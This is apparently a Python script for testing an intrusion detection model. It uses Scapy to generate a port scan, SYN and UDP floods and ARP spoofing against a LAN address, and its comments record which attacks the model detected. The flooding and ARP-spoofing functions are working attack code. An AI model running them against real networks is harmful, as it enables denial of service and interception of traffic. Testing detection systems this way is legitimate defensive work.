

## Simulating a Port Scan <--- Models did not detect the scann (score aprox .30)
# from scapy.all import *

# def port_scan(target_ip, start_port, end_port):
#     print(f"Starting port scan on {target_ip} from port {start_port} to {end_port}")
#     for port in range(start_port, end_port + 1):
#         packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
#         send(packet)

# target_ip = "192.168.1.1"  # Replace with the target IP address
# start_port = 1  # Starting port number for the scan
# end_port = 1024  # Ending port number for the scan

# port_scan(target_ip, start_port, end_port)


## Simulated DOS <----- Model did detect this attack (DOS) score started at .80 and grew to .99 when the attack continued
# from scapy.all import *

# def dos_attack(target_ip, target_port, packet_count):
#     print(f"Starting DoS attack on {target_ip}:{target_port}")
#     for _ in range(packet_count):
#         packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")/("X"*1024)
#         send(packet)

# target_ip = "192.168.1.1"  # Replace with the target IP address
# target_port = 80  # Replace with the target port number
# packet_count = 1000  # Number of packets to send

# dos_attack(target_ip, target_port, packet_count)

# from scapy.all import * <---- SYN Attack was not detected (score was .00000000623)

# def syn_flood(target_ip, target_port, packet_count):
#     print(f"Starting SYN flood attack on {target_ip}:{target_port}")
#     for _ in range(packet_count):
#         packet = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)/TCP(dport=target_port, flags="S")
#         send(packet)

# target_ip = "192.168.1.1"  # Replace with the target IP address
# target_port = 80  # Replace with the target port number
# packet_count = 1000  # Number of packets to send

# syn_flood(target_ip, target_port, packet_count)





from scapy.all import IP, TCP, UDP, send, sendp, Ether, ARP
import threading
import time

# Function to simulate a SYN Flood (DoS Attack)
def syn_flood(target_ip, target_port, duration):
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    end_time = time.time() + duration
    while time.time() < end_time:
        send(packet, verbose=0)

# Function to simulate a Port Scan
def port_scan(target_ip, start_port, end_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        for port in range(start_port, end_port):
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=0)

# Function to simulate an ARP Spoofing attack
def arp_spoof(target_ip, target_mac, spoof_ip, duration):
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    end_time = time.time() + duration
    while time.time() < end_time:
        sendp(packet, verbose=0)

# Function to simulate a UDP Flood attack
def udp_flood(target_ip, target_port, duration):
    packet = IP(dst=target_ip)/UDP(dport=target_port)
    end_time = time.time() + duration
    while time.time() < end_time:
        send(packet, verbose=0)

# Main function to run the attacks
def run_attacks():
    target_ip = "192.168.1.101"  # Replace with the target IP
    target_port = 80  # Replace with the target port if applicable
    target_mac = "00:11:22:33:44:51"  # Replace with the target MAC address if applicable
    spoof_ip = "192.168.1.10"  # Replace with the IP to spoof if applicable
    duration = 2  # Duration in seconds for each attack

    # Running SYN Flood attack
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, duration))
    syn_thread.start()

    # Running Port Scan attack
    scan_thread = threading.Thread(target=port_scan, args=(target_ip, 1, 1024, duration))
    scan_thread.start()

    # Running ARP Spoofing attack
    arp_thread = threading.Thread(target=arp_spoof, args=(target_ip, target_mac, spoof_ip, duration))
    arp_thread.start()

    # Running UDP Flood attack
    udp_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    udp_thread.start()

    # Wait for all threads to complete
    syn_thread.join()
    scan_thread.join()
    arp_thread.join()
    udp_thread.join()

    print("All attacks completed.")

if __name__ == "__main__":
    run_attacks()
